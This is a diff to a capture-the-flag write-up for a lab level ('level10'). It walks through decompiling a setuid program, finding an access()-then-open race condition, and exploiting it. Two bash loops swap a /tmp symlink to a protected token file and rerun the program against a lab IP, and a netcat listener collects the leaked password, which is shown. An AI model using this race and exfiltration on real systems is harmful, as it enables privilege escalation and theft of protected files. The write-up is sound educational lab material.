@@ -7,7 +7,8 @@
 	ls -A
 	```
 
-2. __Observation__ (Guest): the previous command reveals two files of interest, `level10` and `token`
+2. __Observation__ (Guest): the previous command reveals two files of
+	interest, `level10` and `token`
 	```
 	.bash_logout  .bashrc  level10  .profile  token
 	```
@@ -57,9 +58,11 @@
 
 6. __Observation__ (Host): the RetDec decompiler reveals that the
 	`level10` file takes two arguments, a `file` and a `host`
-	- a check on the `file` is done using `access`
-	- if the passed file is valid, a connection on the port `6969` is opened,
-    a TCP socket is created and the file is sent to the client
+	- a check on the `file` is done using `access`, if the user has access to 
+	the file
+	- a connection is attempted on the port `6969`
+	- a banner message is sent (`.*( )*.\n`)
+	- the file is opened, its contents read and sent to the connected host
 	```c
 	// ------------------------ Functions -------------------------
 
@@ -145,45 +148,50 @@
 	because the user might exploit the short time interval between checking and
 	opening the file to manipulate it.
 	```
-7. __Action__ (Guest): exploit the vulnerability of the `access` command to get
-    the password
-    To exploit this vulnerability, we need to swap a file we have the rights to
-    with the `token` file we'll pass to the program.
-    In order to do so, we need two bash scripts.
-    The first script, continuously creates a symbolic link between the `token`
-    file and our file.
-    ```sh
-    #!/bin/bash
+7. __Action__ (Guest): exploit the vulnerability of the `access` command
+	(step 1)
+	The first step consists of continuously cresting a symbolic lin between
+	a file we have the rights to and the `token` file.
+	In order to do so, we need a bash script that continuously creates a
+	symbolic link between the `token` file and our file.
+	```sh
+	#!/bin/bash
 
-    while true; do
-        touch /tmp/file     # maybe remove
-        rm -rf /tmp/file    # maybe remove
-        ln -s /home/user/level10/token /tmp/file
-        rm -rf /tmp/file
-    done
-    ```
-    The second script continously launches the program with our file and our
-    IP address as parameters.
-    ```sh
-    #!/bin/bash
+	while true; do
+		touch /tmp/file     # maybe remove
+		rm -rf /tmp/file    # maybe remove
+		ln -s /home/user/level10/token /tmp/file
+		rm -rf /tmp/file
+	done
+	```
+8. __Action__ (Guest): exploit the vulnerability of the `access` commmand
+	(step 2)
+	The second step consists of continuously launching the `level10` program
+	with the file we have access to and our IP address passed as parameters.
+	In order to do so, we need a bash script that continously launches
+	the program with our file and our IP address as parameters.
+	```sh
+	#!/bin/bash
 
-    while true; do
-        /home/user/level10/level10 /tmp/file 192.168.56.101
-    done
-    ```
-    Once the two scripts are launched, we need to open a third terminal to
-    listen on the port `6969`
-    ```sh
-    nc -lk 6969
-    ```
+	while true; do
+		/home/user/level10/level10 /tmp/file 192.168.56.101
+	done
+	```
+9. __Action__ (Guest): exploit the vulnerability of the `access` command
+	(step 3)
+	Once the two scripts are launched, we need to open a third terminal to
+	listen on the port `6969` and collect the flag
+	```sh
+	nc -lk 6969
+	```
 
-8. __Observation__ (Guest): the password is displayed on stdout
-    ```
-    .*( )*.
-    .*( )*.
-    .*( )*.
-    woupa2yuojeeaaed06riuj63c
-    .*( )*.
-    .*( )*.
-    .*( )*.
-    ```
+10. __Observation__ (Guest): the password is displayed on stdout
+	```
+	.*( )*.
+	.*( )*.
+	.*( )*.
+	woupa2yuojeeaaed06riuj63c
+	.*( )*.
+	.*( )*.
+	.*( )*.
+	```
